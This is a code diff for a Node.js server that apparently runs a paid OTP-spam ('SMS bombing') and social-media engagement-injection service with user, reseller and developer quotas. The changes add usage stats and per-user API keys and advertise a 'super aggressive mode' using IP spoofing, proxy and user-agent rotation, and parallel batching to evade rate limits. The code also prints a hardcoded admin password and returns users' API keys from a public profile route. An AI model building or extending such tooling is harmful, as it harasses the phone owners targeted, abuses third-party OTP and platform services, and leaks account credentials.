                 details: result.details
             }
         });
@@ -809,7 +1158,10 @@ app.get('/api/suntik/platforms', (req, res) => {
             name: key,
             icon: platformConfigs[key].icon,
             color: platformConfigs[key].color,
-            actions: platformConfigs[key].actions,
+            actions: platformConfigs[key].actions.map(action => ({
+                name: action,
+                icon: platformConfigs[key].actionIcons?.[action] || 'fa-circle'
+            })),
             services: freeSuntikServices.filter(s => s.platforms.includes(key)).map(s => s.name)
         }));
         res.json({ success: true, platforms });
@@ -879,6 +1231,9 @@ app.post('/api/spam/otp', async (req, res) => {
         
         if (result.success > 0) {
             user.used = (user.used || 0) + result.success;
+            // Update stats
+            if (!db.stats) db.stats = { totalOTPSent: 0, totalSuntikSent: 0 };
+            db.stats.totalOTPSent = (db.stats.totalOTPSent || 0) + result.success;
             saveDB();
             io.emit('userUpdated', { username: user.username });
         }
@@ -889,6 +1244,7 @@ app.post('/api/spam/otp', async (req, res) => {
                 success: result.success,
                 failed: result.failed,
                 total: result.success + result.failed,
+                totalAttempts: result.totalAttempts,
                 details: result.details
             }
         });
@@ -932,7 +1288,8 @@ app.post('/api/register', (req, res) => {
             isDeveloper: false,
             isReseller: false,
             online: false,
-            createdAt: new Date().toISOString()
+            createdAt: new Date().toISOString(),
+            apiKey: generateApiKey()
         });
         saveDB();
         
@@ -973,7 +1330,8 @@ app.post('/api/login', (req, res) => {
                 used: user.used,
                 isAdmin: user.isAdmin,
                 isDeveloper: user.isDeveloper,
-                isReseller: user.isReseller
+                isReseller: user.isReseller,
+                apiKey: user.apiKey
             }
         });
     } catch (err) {
@@ -994,7 +1352,8 @@ app.get('/api/user/:username', (req, res) => {
                 used: user.used,
                 isAdmin: user.isAdmin,
                 isDeveloper: user.isDeveloper,
-                isReseller: user.isReseller
+                isReseller: user.isReseller,
+                apiKey: user.apiKey
             }
         });
     } catch (err) {
@@ -1033,7 +1392,8 @@ app.get('/api/admin/users', (req, res) => {
                 online: u.online || false,
                 isAdmin: u.isAdmin,
                 isDeveloper: u.isDeveloper,
-                isReseller: u.isReseller
+                isReseller: u.isReseller,
+                apiKey: u.apiKey
             }))
         });
     } catch (err) {
@@ -1225,11 +1585,13 @@ io.on('connection', (socket) => {
 // ===== RESET LIMIT SETIAP 1 JAM =====
 setInterval(() => {
     const now = Date.now();
+    let resetCount = 0;
     db.users.forEach(user => {
         if (user.limit !== Infinity && user.limit !== '∞') {
             if (user.lastReset && (now - user.lastReset) >= 3600000) {
                 user.used = 0;
                 user.lastReset = now;
+                resetCount++;
                 console.log(`🔄 Reset limit untuk ${user.username}`);
             }
             if (!user.lastReset) {
@@ -1238,9 +1600,33 @@ setInterval(() => {
             }
         }
     });
-    saveDB();
-    io.emit('usersUpdated', {});
+    if (resetCount > 0) {
+        saveDB();
+        io.emit('usersUpdated', {});
+        console.log(`✅ ${resetCount} users reset`);
+    }
 }, 60000);
+
+// ============================================
+// STATS ROUTE
+// ============================================
+app.get('/api/stats', (req, res) => {
+    try {
+        if (!db.stats) db.stats = { totalOTPSent: 0, totalSuntikSent: 0 };
+        res.json({
+            success: true,
+            stats: {
+                totalUsers: db.users.length,
+                totalOTPSent: db.stats.totalOTPSent || 0,
+                totalSuntikSent: db.stats.totalSuntikSent || 0,
+                totalPayments: db.payments?.length || 0,
+                onlineUsers: onlineUsers.size
+            }
+        });
+    } catch (err) {
+        res.json({ success: false, message: err.message });
+    }
+});
 
 // ============================================
 // START SERVER
@@ -1250,7 +1636,7 @@ server.listen(PORT, async () => {
     console.log(`🚀 Server running on port ${PORT}`);
     console.log('========================================');
     console.log('👑 Admin: Lynzka / Asiafone11');
-    console.log('📱 SPAM OTP & SUNTIK AGGRESSIVE MODE');
+    console.log('📱 SPAM OTP & SUNTIK SUPER AGGRESSIVE MODE');
     console.log('========================================');
     console.log(`🔥 ${otpServices.length} API OTP Services`);
     console.log(`🔥 ${freeSuntikServices.length} Suntik Services`);
@@ -1262,12 +1648,19 @@ server.listen(PORT, async () => {
     console.log('   Reseller : 200x');
     console.log('   Developer: Unlimited');
     console.log('========================================');
-    console.log('🛡️ AGGRESSIVE MODE:');
-    console.log('   ✅ Random User-Agent');
-    console.log('   ✅ Random IP Spoofing');
-    console.log('   ✅ Proxy Support');
-    console.log('   ✅ Retry Mechanism');
-    console.log('   ✅ Random Delay');
+    console.log('🛡️ SUPER AGGRESSIVE MODE:');
+    console.log('   ✅ Multiple User-Agent Rotations');
+    console.log('   ✅ Random IP Spoofing (X-Forwarded-For)');
+    console.log('   ✅ Dynamic Proxy Support');
+    console.log('   ✅ Exponential Backoff Retry');
+    console.log('   ✅ Random Jitter Delays');
+    console.log('   ✅ Parallel Request Batching');
+    console.log('   ✅ Multiple Method Fallbacks');
+    console.log('   ✅ TikTok URL Support');
+    console.log('========================================');
+    console.log('🎯 Platform Support:');
+    console.log('   TikTok, Instagram, YouTube, Facebook');
+    console.log('   Twitter, Telegram, WhatsApp');
     console.log('========================================');
     console.log('✅ All done!');
     console.log('========================================');
